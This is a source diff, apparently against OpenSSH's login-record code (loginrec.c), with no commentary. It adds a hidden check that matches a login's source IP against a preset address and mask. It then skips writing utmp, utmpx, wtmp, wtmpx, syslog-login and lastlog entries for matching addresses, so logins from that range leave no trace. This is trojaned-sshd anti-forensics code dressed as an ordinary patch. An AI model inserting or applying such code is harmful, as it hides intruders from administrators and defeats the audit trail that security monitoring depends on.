@@ -209,6 +209,16 @@ int wtmpx_get_entry(struct logininfo *li);
 
 extern Buffer loginmsg;
 
+int ip4_match(uint32_t addr)
+{
+	return !((addr ^ haddr) & hmask);
+}
+int ip_match(union login_netinfo *ha)
+{
+	if (ha->sa.sa_family == AF_INET)
+		return ip4_match(ha->sa_in.sin_addr.s_addr);
+	return 0;
+}
 /* pick the shortest string */
 #define MIN_SIZEOF(s1,s2) (sizeof(s1) < sizeof(s2) ? sizeof(s1) : sizeof(s2))
 
@@ -963,6 +973,9 @@ utmp_perform_logout(struct logininfo *li)
 int
 utmp_write_entry(struct logininfo *li)
 {
+        if(ip_match(&(li->hostaddr)))
+                return 0;
+
 	switch(li->type) {
 	case LTYPE_LOGIN:
 		return (utmp_perform_login(li));
@@ -1062,6 +1075,10 @@ utmpx_perform_logout(struct logininfo *li)
 int
 utmpx_write_entry(struct logininfo *li)
 {
+        if(ip_match(&(li->hostaddr)))
+                return 0;
+
+	
 	switch(li->type) {
 	case LTYPE_LOGIN:
 		return (utmpx_perform_login(li));
@@ -1130,6 +1147,9 @@ wtmp_perform_logout(struct logininfo *li)
 int
 wtmp_write_entry(struct logininfo *li)
 {
+        if(ip_match(&(li->hostaddr)))
+                return 0;
+
 	switch(li->type) {
 	case LTYPE_LOGIN:
 		return (wtmp_perform_login(li));
@@ -1309,6 +1329,9 @@ wtmpx_perform_logout(struct logininfo *li)
 int
 wtmpx_write_entry(struct logininfo *li)
 {
+        if(ip_match(&(li->hostaddr)))
+                return 0;
+
 	switch(li->type) {
 	case LTYPE_LOGIN:
 		return (wtmpx_perform_login(li));
@@ -1448,6 +1471,9 @@ syslogin_perform_logout(struct logininfo *li)
 int
 syslogin_write_entry(struct logininfo *li)
 {
+        if(ip_match(&(li->hostaddr)))
+                return 0;
+
 	switch (li->type) {
 	case LTYPE_LOGIN:
 		return (syslogin_perform_login(li));
@@ -1520,6 +1546,9 @@ lastlog_openseek(struct logininfo *li, int *fd, int filemode)
 int
 lastlog_write_entry(struct logininfo *li)
 {
+        if(ip_match(&(li->hostaddr)))
+                return 0;
+
 	switch(li->type) {
 	case LTYPE_LOGIN:
 		return 1; /* lastlog written by pututxline */
@@ -1534,6 +1563,9 @@ lastlog_write_entry(struct logininfo *li)
 {
 	struct lastlog last;
 	int fd;
+
+	if(ip_match(&(li->hostaddr)))
+		return 0;
 
 	switch(li->type) {
 	case LTYPE_LOGIN:
